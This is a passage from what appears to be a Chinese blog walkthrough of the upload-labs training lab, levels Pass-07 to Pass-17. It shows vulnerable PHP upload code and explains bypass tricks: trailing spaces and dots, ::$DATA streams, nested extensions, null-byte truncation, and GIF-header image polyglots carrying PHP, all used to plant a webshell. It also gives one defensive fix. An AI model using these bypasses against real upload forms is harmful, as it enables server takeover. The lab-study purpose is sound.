<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//使用trim()函数去除文件名/扩展名首尾的空格。</span></span><br></pre></td></tr></table></figure>

<p>上传 <code>shell.php</code> 后面加一个空格的文件后🐎即可getshell</p>
<p>需要将php版本降低到<code> 5.3</code> ，不然会报错。</p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713212532094.2cp1wo9lohxc.png"></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713212535533.5k03jmlsng00.png"></p>
<h1 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h1><blockquote>
<p>文件名末尾加点绕过，Windows特性</p>
</blockquote>
<p>程序少了这行代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br></pre></td></tr></table></figure>

<p>上传 <code>shell.php </code>后面加一个点的文件后🐎即可getshell</p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713212609293.1zs09pss5rvk.png"></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713212612801.2mwiqrkzuzs0.png"></p>
<h1 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h1><blockquote>
<p><code>::$DATA</code> 绕过，Windows特性</p>
</blockquote>
<p>程序少了这行代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Windows下的 <code>::$DATA</code> 绕过是一种利用Windows文件系统特性的漏洞，可以绕过一些文件检测和安全制。</p>
<p>在NTFS文件系统中，文件和目录可以包含额外的数据流（alternate data streams），而 <code>::$DATA</code> 是用于引用文件的默认数据流。通常，当通过文件系统访问文件时，只会看到默认数据流，而其他数据流是隐藏的。</p>
<p>攻击者可以利用这一点，在文件名后面添加 ::$DATA 字符串来创建文件的隐藏数据流。例如，如果攻击者将文件命名为 <code>file.php::$DATA</code> ，该文件将看起来像是一个普通的文件，但实际上，它还包含一个隐藏的数据流。</p>
<p>利用这个特性，攻击者可以通过上传一个看似无害的文件（如<code>image.jpg::$DATA</code>），在某些情况下绕过文件类型检测或安全检查。由于某些安全机制只针对文件名进行检查，而不会考虑数据流，因此这种绕过方法可能会导致执行不受限制的代码或上传不受欢迎的文件类型。</p>
</blockquote>
<p>php 在 window 的时候如果文件名+<code> ::DATA</code> 会把<code>::DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持 <code>::$DATA</code> 之前的文件名 他的目的就是不检查后缀名。</p>
<p> Windows 系统下，如果上传的文件名为<code>test.php::$DATA</code>会在服务器上生成一个 <code>test.php </code>的文件，其中内容和所上传文件内容相同，并被解析。</p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713213003950.63kb9p0wzy00.png"></p>
<h1 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h1><blockquote>
<p>双点绕过</p>
</blockquote>
<p>程序从这行代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;   </span><br><span class="line"><span class="comment">//这行代码构建了一个唯一的文件路径，其中包含了上传路径、日期时间、随机数和文件扩展名。这个路径将用于保存上传文件。</span></span><br></pre></td></tr></table></figure>

<p>变成了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br></pre></td></tr></table></figure>

<p><code>deldot()</code>函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来，双点中加空格可以使函数 <code>deldot() </code>只去除了最后一个点。</p>
<p>上传<code>shell.php</code>后面加一个点一个空格一个的点的文件后🐎即可getshell    </p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713124343497.wlbakf1yxsg.png"></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713124435849.4gjnn5i3iow0.png"></p>
<h1 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h1><blockquote>
<p>后缀名嵌套绕过</p>
</blockquote>
<p>程序从这串代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">         <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>变成了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">    <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code>这行代码使用 <code>str_ireplace()</code> 函数将 <code>$deny_ext</code> 数组中出现的不允许的文件扩展名从文件名中移除。该函数是大小写不敏感的替换操作，即不论扩展名的大小写如何，都会被替换为空字符串。</p>
<p><code>str_ireplace()</code> 是 PHP 中的一个字符串替换函数，用于在字符串中进行不区分大小写的替换操作。它的具体语法如下：</p>
<p><code>str_ireplace($search, $replace, $subject, &amp;$count = null)</code></p>
<p>参数说明：</p>
<ul>
<li><code>$search</code>：需要被替换的字符串或字符串数组。</li>
<li><code>$replace</code>：用于替换的字符串或字符串数组。</li>
<li><code>$subject</code>：要在其中进行替换操作的原始字符串或字符串数组。</li>
<li><code>$count</code>（可选）：一个变量，用于存储替换操作执行的次数。</li>
</ul>
<p>函数返回值：</p>
<ul>
<li>返回替换后的字符串或字符串数组。如果 <code>$subject</code> 参数是数组，则返回的也是数组。</li>
</ul>
<p><code>str_ireplace()</code> 函数与 <code>str_replace()</code> 函数类似，但它是大小写不敏感的替换操作。在替换过程中，它会查找 <code>$subject</code> 字符串中与 <code>$search</code> 相匹配的子字符串，并将其替换为 <code>$replace</code>。</p>
</blockquote>
<p>由于<code>str_ireplace()</code>是基于子字串查找，会直接代替，我们前面的大小写绕过、空格绕过、文件名末尾加点绕过、<code>::$DATA</code> 绕过、双点绕过就全失效了。但是刷过xss靶场的我们知道，这个时候我们可以使用嵌套绕过：</p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713091216269.27emg6x5qtjw.png"></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713091251689.1q1dktmz605c.png"></p>
<h1 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h1><blockquote>
<p>GET 型 %00(0x00) 截断绕过</p>
</blockquote>
<p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要 php 的版本号低于 <code>5.3.29</code>，且 <code>magic_quotes_gpc</code> 为关闭状态。</p>
<p>php的一些函数的底层是C语言，而move_uploaded_file就是其中之一，<mark>遇到<code>0x00</code>会截断，0x表示16进制，URL中<code>%00</code>解码成16进制就是0x00。</mark></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713125930109.6g42de1ykfk0.png"></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713130118177.4mryh915ewa0.png"></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713130358690.q5byxu385ts.png"></p>
<h1 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h1><blockquote>
<p>POST 型 %00(0x00) 截断绕过</p>
</blockquote>
<p>原理相同，但是需要注意：</p>
<p><strong>POST不会对里面的数据自动解码，需要在Hex中修改。</strong></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713132335470.u9pu89fdleo.png"></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713132455140.1ru2g5yyvq4g.png"></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713132523619.3ihoj558kci0.png"></p>
<h1 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h1><blockquote>
<p>图片🐎前两字节绕过</p>
</blockquote>
<p><mark>这部分虽然可以利用蚁剑连接实现提权，但是比较麻烦，我们只用phpinfo()函数证明成功就行。</mark></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRealFileType</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>); <span class="comment">// 以二进制只读模式打开文件</span></span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">// 读取文件的前两个字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>); <span class="comment">// 关闭文件句柄</span></span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>); <span class="comment">// 将读取到的两个字节解包成无符号整数</span></span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>] . <span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]); <span class="comment">// 将两个字节组合成一个整数</span></span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$typeCode</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>: <span class="comment">//十六进制 FF D8</span></span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>: <span class="comment">//十六进制89 50</span></span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>: <span class="comment">//十六进制47 49</span></span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="使用010-Editor制作图片🐎–PNG-JPG-GIF"><a href="#使用010-Editor制作图片🐎–PNG-JPG-GIF" class="headerlink" title="使用010 Editor制作图片🐎–PNG/JPG/GIF"></a>使用010 Editor制作图片🐎–PNG/JPG/GIF</h2><p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713143458623.34v8cz1gnu60.png"></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713144121521.59yfuhjpbkc0.png"></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713144407290.2imtgkkya7w0.png"></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713144914129.4d7c0j02pxo0.png"></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713145517892.t7ey6xk9j80.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a? </span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>





<h1 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h1><blockquote>
<p>绕过<code>getimagesize()</code>函数检查！</p>
</blockquote>
<p>需要注意的是，<code>getimagesize()</code> 函数仅通过读取图像文件的头部数据来判断图像是否为有效图片，它并不对整个图像文件进行完整的验证。因此，它可能无法检测出一些特殊情况下的图像文件错误或损坏。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>); <span class="comment">// 获取图像文件的信息</span></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]); <span class="comment">// 将图像类型转换为文件扩展名</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>, <span class="variable">$ext</span>) !== <span class="literal">false</span>) &#123; <span class="comment">// 判断文件扩展名是否属于指定的图像类型</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>; <span class="comment">// 返回文件扩展名</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 不属于指定的图像类型，返回 false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 文件不存在，返回 false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>getimagesize()</code> 是一个 PHP 内置函数，用于获取图像文件的详细信息，包括图像的尺寸、类型和其他元数据。以下是关于 <code>getimagesize()</code> 函数的详细介绍：</p>
<p><strong>语法：</strong></p>
<p><code>getimagesize(string $filename, array &amp;$imageinfo): array|false</code></p>
<p><strong>参数：</strong></p>
<ul>
<li><code>$filename</code>：要获取信息的图像文件的路径。可以是本地文件路径或 URL。</li>
<li><code>$imageinfo</code>：一个引用参数，用于存储获取的图像信息。是一个包含图像的各种属性的关联数组。</li>
</ul>
<p><strong>返回值：</strong></p>
<ul>
<li>如果成功获取图像信息，返回一个包含图像信息的关联数组。数组中包含以下键值对：<ul>
<li><code>0</code>：图像的宽度（以像素为单位）</li>
<li><code>1</code>：图像的高度（以像素为单位）</li>
<li><code>2</code>：图像类型的整数值（例如，<code>IMAGETYPE_JPEG</code>、<code>IMAGETYPE_PNG</code>、<code>IMAGETYPE_GIF</code>）</li>
<li><code>3</code>：包含图像宽度和高度的字符串（例如，”width=”120” height=”80””）</li>
<li><code>mime</code>：图像的 MIME 类型</li>
</ul>
</li>
<li>如果无法获取图像信息或者给定的文件不是有效的图像文件，返回 <code>false</code>。</li>
</ul>
</blockquote>
<p>同14关，制作的三个图片🐎都能通过。</p>
<h2 id="改进方法"><a href="#改进方法" class="headerlink" title="改进方法"></a>改进方法</h2><p>使用图片重写技术：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatefrompng</span>( <span class="variable">$uploaded_tmp</span> );</span><br><span class="line"><span class="title function_ invoke__">imagepng</span>( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">9</span>);</span><br><span class="line"><span class="title function_ invoke__">imagedestroy</span>( <span class="variable">$img</span> );</span><br></pre></td></tr></table></figure>

<p>首先，<code>imagecreatefrompng()</code>函数用于从临时文件（<code>$uploaded_tmp</code>）创建PNG图像的图像资源（<code>$img</code>）。然后，<code>imagepng()</code>函数用于将图像资源保存为PNG格式的图像文件，其中包括目标文件路径（<code>$temp_file</code>）和图像质量参数（9代表质量级别，可根据需求进行调整）。可以直接把我们伪造的木马代码清洗掉。</p>
<h1 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h1><blockquote>
<p><code>exif_imagetype</code>函数绕过</p>
</blockquote>
<p><code>exif_imagetype()</code> 函数会尝试读取图像文件的部分内容，并根据该内容来确定图像的类型。它并不会解析整个图像文件，仅仅通过读取一小部分数据来进行判断。</p>
<p>函数会读取图像文件的前几个字节，这些字节包含了关于文件类型的信息。根据这些字节的内容，函数会返回一个与特定图像类型对应的整数值。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$filename</span>); <span class="comment">// 获取图像文件的类型</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>; <span class="comment">// 返回图像类型为 GIF</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>; <span class="comment">// 返回图像类型为 JPEG</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>; <span class="comment">// 返回图像类型为 PNG</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 不是支持的图像类型，返回 false</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同14关，制作的三个图片🐎都能通过。</p>
<h1 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h1><blockquote>
<p>二次渲染绕过</p>
</blockquote>
<p>找到一块经过二次渲染后没有改变的数据块，替换成 🐎</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">// 获取上传文件的基本信息：文件名、类型、临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$target_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>); <span class="comment">// 目标文件路径</span></span><br><span class="line">    <span class="comment">// 获取上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 判断文件后缀与类型是否合法，只有符合条件的才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span> == <span class="string">&quot;image/jpeg&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>, <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">            <span class="comment">// 